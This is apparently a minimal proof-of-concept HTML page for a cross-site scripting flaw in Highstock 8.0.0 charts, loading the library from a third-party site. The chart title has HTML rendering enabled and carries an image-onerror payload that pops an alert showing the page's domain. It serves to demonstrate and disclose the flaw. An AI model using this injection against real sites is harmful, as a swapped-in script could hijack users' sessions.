# highstock-xss-poc
<!DOCTYPE html>
<html>
<head>
  <title>Highstock XSS Test</title>
  <script src="https://www.six-structured-products.com/js/highstock/8.0.0/highstock.js"></script>
</head>
<body>
  <div id="container" style="height: 400px; min-width: 310px"></div>

  <script>
    Highcharts.chart('container', {
      chart: { type: 'bar' },
      title: {
        useHTML: true,
        text: '<img src=x onerror=alert(document.domain)>'
      },
      series: [{
        data: [1, 2, 3]
      }]
    });
  </script>
</body>
</html>
